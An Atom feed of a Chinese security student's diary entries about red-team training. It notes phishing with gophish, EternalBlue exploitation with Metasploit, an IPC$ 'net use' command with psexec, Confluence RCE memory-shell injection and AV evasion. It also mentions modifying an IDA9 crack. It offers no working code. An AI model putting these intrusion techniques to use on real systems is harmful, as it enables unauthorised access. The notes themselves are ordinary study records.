<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.top/atom.xml" rel="self"/>
  
  <link href="https://c-lby.top/"/>
  <updated>2024-08-23T11:56:21.017Z</updated>
  <id>https://c-lby.top/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>日志 24-8-23</title>
    <link href="https://c-lby.top/2024/08/23/24-8-23/"/>
    <id>https://c-lby.top/2024/08/23/24-8-23/</id>
    <published>2024-08-23T11:28:37.000Z</published>
    <updated>2024-08-23T11:56:21.017Z</updated>
    
    <content type="html"><![CDATA[<p>今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。</p><p>可能老了，不喜欢太花里胡哨的东西了（</p><p>今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。</p><p>今天似乎过得异常地轻松，比起前几天高强度的学习和考核。总算可以休息一会了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。&lt;/p&gt;
&lt;p&gt;可能老了，不喜欢太花里胡哨的东西了（&lt;/p&gt;
&lt;p&gt;今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-22</title>
    <link href="https://c-lby.top/2024/08/22/diary/24-8-22/"/>
    <id>https://c-lby.top/2024/08/22/diary/24-8-22/</id>
    <published>2024-08-21T16:29:36.000Z</published>
    <updated>2024-08-22T16:58:26.665Z</updated>
    
    <content type="html"><![CDATA[<p>今天感觉老师并没有怎么讲课，一直在打靶场……不过倒是第一次getshell，通关靶场了，接触了crm这种应用，之前没碰过。</p><p>今天把昨天遗留的时钟插件装好了，但是shell还没时间搞，再推一推。时钟插件是靠conky进行管理的，conky-manager2可以直接在shell输入然后就会有UI界面了。如果出现方框，那是因为设置那里时间设置成了中文格式，换成英文就好了。</p><p>关于conky下载安装相关的<a href="https://blog.csdn.net/2301_76911706/article/details/133000145">教程</a></p><p>下载还是在gnome那些官网找，然后下载解压之后塞到<code>~/.conky</code>里就行了。一般.conf文件里装着<a href="https://forum.ubuntu.com.cn/viewtopic.php?t=372261">配置</a>，可以自己调，不要的部分也可以通过删掉下面代码的部分删掉。</p><p>关于ubuntu中字体的安装<a href="https://blog.csdn.net/qq_37955704/article/details/117901454">https://blog.csdn.net/qq_37955704/article/details/117901454</a></p><p>今天VN里面试一个大三的师傅，出的题目很多不会要学习的地方，总之先记录下来一篇到时候学习，后面也可以翻一翻22号的聊天记录，多学。</p><p><a href="https://chovid99.github.io/posts/gcc-ctf-2024/#social-media">GCC CTF 2024</a></p><p>今天光速秒了base第二周pwn题，虽然我觉得对于新生不算很友好，尤其是syscall shellcode题，有点模仿xyctf的感觉，一眼就能看出来了，但是新生一没汇编基础二没动调经验，虽然不排除有人天赋很好，但是这样为了出题而出题总感觉怪怪的。发过来看，想要不成为这样的出题人，还需要继续加强自己的功底才行。</p><p>也是见到知道创宇的老总“黑哥”（周景平）了，中国十大黑客之一，这么近距离接触大牛的机会还是很少的，虽然其实没怎么听讲座……不过里面提到的几个点确实值得我们思考：</p><ul><li>gpt要成为我们的工具而不是玩具</li><li>老板向员工交代任务是一种艺术，我们使用gpt的时候也应该是才行</li></ul><p>被推去粤盾做蓝方，还是第一次做蓝方。大二就能进护网项目，知足吧，虽然价格是低了点，但是经验就摆在那也没办法，还是多学习学习积累经验吧。虚心一点，你不是万能的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天感觉老师并没有怎么讲课，一直在打靶场……不过倒是第一次getshell，通关靶场了，接触了crm这种应用，之前没碰过。&lt;/p&gt;
&lt;p&gt;今天把昨天遗留的时钟插件装好了，但是shell还没时间搞，再推一推。时钟插件是靠conky进行管理的，conky-manager2可以直接在shell输入然后就会有UI界面了。如果出现方框，那是因为设置那里时间设置成了中文格式，换成英文就好了。&lt;/p&gt;
&lt;p&gt;关于conky下载安装相关的&lt;a href=&quot;https://blog.csdn.net/2301_76911706/article/details/133000145&quot;&gt;教程&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-21</title>
    <link href="https://c-lby.top/2024/08/21/diary/24-8-21/"/>
    <id>https://c-lby.top/2024/08/21/diary/24-8-21/</id>
    <published>2024-08-21T04:00:36.000Z</published>
    <updated>2024-08-21T17:34:01.763Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/ghostyusheng/article/details/80321483">docker-ce解决官网无法连接的问题</a></p><p>docker换源之后记得要<code>systemctl daemon-reload</code> <code>systemctl restart docker.service</code>重启一下docker相关的服务。</p><p>关于ubuntu22美化的资料：</p><p><a href="https://blog.csdn.net/weixin_44348719/article/details/132521680">https://blog.csdn.net/weixin_44348719/article/details/132521680</a></p><p><a href="https://blog.csdn.net/2301_76911706/article/details/133000145">https://blog.csdn.net/2301_76911706/article/details/133000145</a></p><p><a href="https://blog.csdn.net/qq_44928822/article/details/129358224">https://blog.csdn.net/qq_44928822/article/details/129358224</a></p><p><a href="https://blog.51cto.com/zhangxueliang/5376229">https://blog.51cto.com/zhangxueliang/5376229</a></p><p><a href="https://www.gnome-look.org/browse/">https://www.gnome-look.org/browse/</a></p><p><a href="https://www.cnblogs.com/WHU-TD/p/14010786.html">https://www.cnblogs.com/WHU-TD/p/14010786.html</a></p><p>主界面配置得差不多了，很满意。接下来就是自定义terminal了，交给明天的我来处理吧！</p><p>大概给终端加个背景图片就差不多了，还有就是修改一下pwndbg的显示，依然用wsl里用的模板就行，和tmux一起真的是天作之合，可惜还不熟悉tmux的操作，还得多练。</p><p>gnome-tweaks是可以直接在终端输入后打开UI界面的。gnome的那些插件在安装之前一定要在火狐或者chrome上安装拓展。打开这个网站<code>https://extensions.gnome.org</code>之后就会提示你安装插件了。在火狐上安装插件之后，要手动在插件界面允许与本地gnome交互，不然插件是无效的。然后就可以开始安装拓展了。想要调拓展的设置，要在<code>installed extends</code>界面，就有设置可以调了。</p><p>哦对，本地还要安装<code>gnome-chrome-connector</code>这个软件包。22以前的的软件包名字和23开始名字不一样，但是官网有提示。</p><p>全场最佳，那个跟随鼠标的眼睛（</p><p>有时间还是详细写一篇博文记录一下吧。</p><p>shit忽然想起来时钟插件忘了装，一样明天再装好了。<a href="https://blog.csdn.net/2301_76911706/article/details/133000145">教程</a></p><p>如果可以，真的像买台笔记本专门装一个ubuntu来使用。一定很舒服</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ghostyusheng/article/details/80321483&quot;&gt;docker-ce解决官网无法连接的问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;docker换源之后记得要&lt;code&gt;systemctl daemon-reload&lt;/code&gt; &lt;code&gt;systemctl restart docker.service&lt;/code&gt;重启一下docker相关的服务。&lt;/p&gt;
&lt;p&gt;关于ubuntu22美化的资料：&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-20</title>
    <link href="https://c-lby.top/2024/08/20/diary/24-8-20/"/>
    <id>https://c-lby.top/2024/08/20/diary/24-8-20/</id>
    <published>2024-08-20T05:27:52.000Z</published>
    <updated>2024-08-22T16:28:49.804Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/zhuminghui/p/16396100.html">bat命令的安装与使用（batcat）</a>支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。</p><p>linux kernel题目中的cpio文件是一种备份文件，解压流程如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_lby@laptop:/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">c_lby@laptop:/core$ mv core.cpio core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ gunzip core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ cpio -idm &lt; core.cpio</span><br><span class="line">104379 blocks</span><br></pre></td></tr></table></figure><p>感觉今天唯一学会的就是如何使用宝塔搭建站点，虚拟机里搭建环境的话，一般域名就设置成虚拟机的内网IP就行。记得要设置默认页面。如果是MVC模式的框架，一般就一个像index.php这样的入口文件，就设置一个就行。然后数据库的设置，一定要设置好密码用户名和数据库名，一定要和站点配置对得上，不然会报错。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhuminghui/p/16396100.html&quot;&gt;bat命令的安装与使用（batcat）&lt;/a&gt;支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。&lt;/p&gt;
&lt;p&gt;linux kernel题目中的cpio文件是一种备份文件，解压流程如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ mv core.cpio core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ gunzip core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ cpio -idm &amp;lt; core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104379 blocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-19</title>
    <link href="https://c-lby.top/2024/08/19/diary/24-8-19/"/>
    <id>https://c-lby.top/2024/08/19/diary/24-8-19/</id>
    <published>2024-08-19T10:43:19.000Z</published>
    <updated>2024-08-20T05:23:39.316Z</updated>
    
    <content type="html"><![CDATA[<p>Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。</p><p><a href="https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1">cve的解析</a></p><p><a href="https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230">k0shl师傅的博客</a></p><p><a href="https://xiaodaozhi.com/exploit/122.html">https://xiaodaozhi.com/exploit/122.html</a></p><p><a href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md</a></p><p><a href="https://blog.csdn.net/pangshaohua/article/details/6592390#:~:text=%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95%EF%BC%9A%20%E2%80%9C%E6%88%91%E7%9A%84%E7%94%B5%E8%84%91%E2%80%9D%E5%B1%9E%E6%80%A7%E4%B8%AD%EF%BC%8C%E9%AB%98%E7%BA%A7%E8%AE%BE%E7%BD%AE%E9%87%8C%EF%BC%8C%20%E6%9C%89%E4%B8%AA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%8C%20%E5%8F%98%E9%87%8F%E5%90%8D%EF%BC%9A_NT_SYMBOL_PATH,%E5%8F%98%E9%87%8F%E5%80%BC%EF%BC%9ASRV%2A%20%7B%24Path%7D%2Ahttp%3A%2F%2Fmsdl.microsoft.com%2Fdownload%2Fsymbols%2F%20%E5%B0%86%E2%80%9C%20%7B%24Path%7D%E2%80%9D%E6%9B%BF%E6%8D%A2%E4%B8%BA%E8%A6%81%E5%AD%98%E5%82%A8pdb%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%AF%94%E5%A6%82%EF%BC%9AC%3APDB">windbg&#x2F;ida自动下载符号表的设置方法</a></p><p><a href="https://www.anquanke.com/post/id/84911">cve复现</a></p><p><a href="https://github.com/AabyssZG/Docker-TCP-Scan">曾哥的新工具</a></p><p><a href="https://www.4hou.com/posts/n7V5">驱动漏洞挖掘入门</a></p><p>可以说是第一次接触到域渗透，一点经验也没有。菜就多练。</p><p>永恒之蓝的使用是基于139和445端口的开放，且特定漏洞版本下才能使用。使用msf框架可以比较方便地对此进行检测盒利用。kali中使用msfconsole。</p><p>445端口是可以直接在cmd中用<code>net use \\ip\ipc$ password /user:username</code>连接的</p><p>如果有完整权限，可以用psexec工具并接管其cmd。这个工具是微软官方的，也可以用\impacket-examples-windows的。</p><p>linux用多了，Windows的命令不会用一点，平时都是用的gui界面，要多学习Windows命令才行</p><p>要开始学习Windows开发等知识了，不然到时候练PoC都看不懂。</p><p>顺便记录一下今天想到的新生赛出题思路。之前忘记是做什么题了，一道简单的ret2text，然而传参却是往后推了一个的，也就是从rdx开始传。所以可以给一个这样的思路：给一个pop rdx，给一个mov rdi,rdx的gadget，然后组合传参。或者能不能自己写一个简单的so库，so中实现一个自定义的system函数，传两个参数，用其他东西占用一个参数位置，让其他参数顺延（也可以用execve）。</p><p>另一个出题想法是给<code>pop r8``call r8</code>这样的gadget，配合固定地址的mmap写shellcode，但是要自己利用栈溢出来执行shellcode。诶等等但是这样岂不是可以把地址写到ret位置上？可以给传入的参数加上字符过滤就好了。比如0x114514这样的地址，一般来说是不合法的，那么就可以在检查字符串的时候提示，地址非法。检查的话，为了防止加偏移绕过，可以用白名单的方式，比如检查是否来自程序基址段或者libc地址段上。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1&quot;&gt;cve的解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230&quot;&gt;k0shl师傅的博客&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-18</title>
    <link href="https://c-lby.top/2024/08/18/diary/24-8-18/"/>
    <id>https://c-lby.top/2024/08/18/diary/24-8-18/</id>
    <published>2024-08-17T16:29:16.000Z</published>
    <updated>2024-08-18T17:48:46.105Z</updated>
    
    <content type="html"><![CDATA[<p>今天学的内容，是路由器固件漏洞挖掘和杀软漏洞挖掘。没有讲到环境模拟和固件提取，专注于讲漏洞挖掘。学到很多东西。捋一下</p><ul><li>实战中，IDA逆向分析的入手点一般是字符串。像路由器和杀软这样的二进制程序，会产生大量的日志，写这些日志就会有很多字符串留存在程序当中，而且其实一般不会像CTF一样各种隐藏。所以可以把具体位置的日志信息当做注释来看，辅助分析。</li><li>有些攻击面，有些漏洞，其实要结合web的知识，尤其是逻辑漏洞。比如没有过滤字符导致的目录穿越、sql注入等等。不要只带着二进制漏洞的思想去看iot中的漏挖</li><li>一般路由器（包括其他IOT设备）最好是挖未授权，授权后的漏洞一般利用条件比较难。</li><li>不要和别人挤破头都去找大热门被挖烂了的攻击面，找些冷门的。</li><li>不要放过任何一个小洞，可能可以和其他洞组合成一个大洞。</li><li>有些路由器是可以ssh上去的（比如华硕）</li></ul><p>初次体验了一下fuzz，用winafl，虽然最后因为环境配置问题（主要还是那个RIO），没跑成功。RIO如果要在本地编译需要安装perl，现在安装这玩意真是鬼死麻烦，已下载安装包，<strong>未配置，有时间再跑一下</strong>。讲讲收获：</p><ul><li>如何在cpp中静、动态调用dll，封装想要调试的函数（或流程）。</li><li>fuzz一个封装了想要测试的接口的程序，比测试原本的程序更快更方便。</li><li>winafl的参数设置，<strong>后面专门写一篇博客分析一下</strong>，还有写多开主次线程的批处理文件方法。</li><li>对于二进制插桩有了更深一层的理解，但是感觉还远远不够。</li><li><a href="https://libuv-docs-chinese.readthedocs.io/zh/latest/api.html">libuv库</a></li></ul><p>同学来问关于wsl代理的问题，我也是该<strong>找时间研究一下</strong>了，自己使用起来也是有点麻烦的，包括git终端也是不走代理，很难受。关于<a href="https://blog.dejavu.moe/posts/cfw-tun/">tun</a>和<a href="https://clashforwindows.cc/tun-%E6%A8%A1%E5%BC%8F/">tun</a>。</p><p>VM的vmdk磁盘文件可以通过ovf加载整台虚拟机，如果遇到hash对不上的情况，删掉打包的时候带有的mf文件即可。</p>]]></content>
    
    
    <summary type="html">三项待办</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-17</title>
    <link href="https://c-lby.top/2024/08/17/diary/24-8-17/"/>
    <id>https://c-lby.top/2024/08/17/diary/24-8-17/</id>
    <published>2024-08-17T01:29:19.000Z</published>
    <updated>2024-08-17T19:59:55.952Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.yuque.com/hxfqg9">yichen师傅的知识库</a>，有IoT，硬件安全，智能合约，web等.</p><p>劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。</p><p>大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。</p><p>学到的新知识或资源有</p><ul><li><a href="https://www.anquanke.com/post/id/225870">内存马</a></li><li>冰蝎的使用（很强大，可以扫描网络资产存活的主机和运行的服务，搭建隧道实现内网穿透等等）</li><li>cve-2021-26084（<a href="https://www.cnblogs.com/NoId/p/16573825.html">confluence</a>的一个rce）</li><li>PostgreSQL数据库（可以用navicat连接，也可以用linux下的psql工具）</li><li>开源工具ConfluenceMemshell，可以一键给confluence注入内存马（有漏洞的情况下）</li><li><a href="https://blog.csdn.net/qq_39583774/article/details/130947754">双重内网横穿</a>，其实今天的靶场中最后一步也有这个场景，但是没做出来，有待复现</li><li><a href="https://tq.jxsec.cn/cas/index">天穹靶场</a></li><li><a href="https://www.somd5.com/">somd5</a></li></ul><p>哦对，顺便把kernel basic和ret2usr学了，虽然还没自己复现，有时间再说吧。大概思路是明白了，果然，之前没看懂的的知识，过一段时间再看就能看懂了，虽然最本初的原理还没去研究，但是流程和做法大致理解了。</p><p>顺带一提，还要找时间看看IDA9的破解原理，看能不能把名字改一下。其实研究那个py脚本文件就好了吧我想。看了一眼，果不其然，试试能不能改生效。大功告成！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/hxfqg9&quot;&gt;yichen师傅的知识库&lt;/a&gt;，有IoT，硬件安全，智能合约，web等.&lt;/p&gt;
&lt;p&gt;劳累的一天。今天学内网渗透，虽然因为不怎么感兴趣而听得很潦草（？），但是依然学到了很多东西。不得不承认，这个地方真的能学到东西，老师真的会告诉你要怎么实操，要找什么东西要怎么找。这两三天来大量高深知识涌入脑子，能不能吸收另当别论，至少确确实实是有用且能用的知识与技能。&lt;/p&gt;
&lt;p&gt;大部分知识也都记在笔记里了，重要的是晚上的靶场模拟演练切切实实感受了一遍内网渗透，或者说后渗透的大致流程和一些操作技巧等等。但是因为没什么经验，所以打得很菜，实际能找到的flag只有两个……虽然跟着思路现学新工具和知识复现打出了4个flag，依然有一个没能找到。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-16</title>
    <link href="https://c-lby.top/2024/08/16/diary/24-8-16/"/>
    <id>https://c-lby.top/2024/08/16/diary/24-8-16/</id>
    <published>2024-08-15T17:15:52.000Z</published>
    <updated>2024-08-16T17:20:45.439Z</updated>
    
    <content type="html"><![CDATA[<p>其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。</p><p>第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/132109655">资料</a></p><p>第三是，很久没用过web伪协议的知识了，应该要回顾一下了。</p><p>第四是，我觉得可能当下比较重要的一点，应该要开始接触一点点linux kernel的内容了。<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA">资料是a3师傅的博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实现在是17号凌晨，不过有接触到新的东西所以还是记录一下。首先是今天培训讲的内容有关Windows免杀，还算是比较感兴趣。但是苦于基础知识不多，开发能力欠缺，学起来和实践起来还是有点痛苦的。如果以后要走免杀研究或者杀软对抗这条路的话，至少要学好cpp、go、rust之类的语言，同时还要学Windows api相关的东西。&lt;/p&gt;
&lt;p&gt;第二是做了一道背包加密的题目，用LLL算法在sage进行解密，这部分知识有待进一步深入学习。&lt;a href=&quot;https://blog.csdn.net/XiongSiqi_blog/article/details/132109655&quot;&gt;资料&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第三是，很久没用过web伪协议的知识了，应该要回顾一下了。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-14</title>
    <link href="https://c-lby.top/2024/08/14/diary/24-8-14/"/>
    <id>https://c-lby.top/2024/08/14/diary/24-8-14/</id>
    <published>2024-08-14T02:41:38.000Z</published>
    <updated>2024-08-14T15:50:59.173Z</updated>
    
    <content type="html"><![CDATA[<p>今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。</p><p>VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了<a href="https://vnteam.cn/members/%E3%80%82oss%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E9%98%BF%E9%87%8C%E4%BA%91%E7%9A%84%E5%AF%B9%E8%B1%A1%E5%82%A8%E5%AD%98%E6%9C%8D%E5%8A%A1%E3%80%82%E6%9C%89%E6%97%B6%E9%97%B4%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E3%80%82">https://vnteam.cn/members/。oss是什么？阿里云的对象储存服务。有时间了解一下。</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天似乎什么也没学，来青马红客训练营这边报了个道，也是来到锦行科技的公司了。&lt;/p&gt;
&lt;p&gt;VN的成员页做好了，因为头像托管在github上加载有点慢，所以汪队帮我传到oss上了&lt;a href=&quot;https://vnteam.cn/members/%E3%80%82oss%</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-13</title>
    <link href="https://c-lby.top/2024/08/13/diary/24-8-13/"/>
    <id>https://c-lby.top/2024/08/13/diary/24-8-13/</id>
    <published>2024-08-13T02:38:17.000Z</published>
    <updated>2024-08-14T16:15:24.772Z</updated>
    
    <content type="html"><![CDATA[<p>ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。<a href="https://blog.csdn.net/qq_45927266/article/details/120380343">资料</a>。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。</p><p>晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了<a href="https://tech.soraharu.com/archives/96/">资料</a>，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。</p><p>感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ak了moe的web，太久没做ctf的web题，有点手生了。很艰难地学习并大概理解了pop链要怎么做，感谢jjg的帮助。&lt;a href=&quot;https://blog.csdn.net/qq_45927266/article/details/120380343&quot;&gt;资料&lt;/a&gt;。之前是一点都看不懂，现在感觉能理解什么意思了，也知道要怎么生成payload了。最好还是全面学习一下php比较好，pwn题也会用得到。&lt;/p&gt;
&lt;p&gt;晚上忽然上新一道运维题，抢救一个误删了glibc的linux系统，每次环境只有一次机会，因为仅存一个shell，如果断连了就没有了。也是第一次知道ls、cp这些命令是依赖于glibc的。找到了&lt;a href=&quot;https://tech.soraharu.com/archives/96/&quot;&gt;资料&lt;/a&gt;，之前一直看到busybox，但没有真正去了解他，现在大概知道是个什么东西了。在我看来就是适合塞进嵌入式的小体积静态编译二进制程序包，可以实现linux的命令之类的功能，很方便。之后有时间也要深入了解一下。&lt;/p&gt;
&lt;p&gt;感觉自己linux学得也是半斤八两，还是系统学习一下运维知识比较好。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-12</title>
    <link href="https://c-lby.top/2024/08/12/diary/24-8-12/"/>
    <id>https://c-lby.top/2024/08/12/diary/24-8-12/</id>
    <published>2024-08-12T09:39:37.000Z</published>
    <updated>2024-08-12T09:40:44.121Z</updated>
    
    <content type="html"><![CDATA[<p>可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。</p><p>换了个生成器，可以限定某个页面只显示特定tag的文章，完美解决。还有一点麻烦的是每次新建文章，都要手动整理文章到路径。如果用-p参数，则没法自动抓取front-matter模板，今日乏了，不改源码了。我记得好像有现成的插件可以自动分类文件夹的，明天在找找。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可算是把页面处理好了，但是页面读取文章只能从全部文章列表里筛选符合diary分类的文章出来显示。换句话来说，他会作为一篇post出现在其他页面，虽然可以用隐藏，但是写frontmatter比较麻烦，得想个办法才行。&lt;/p&gt;
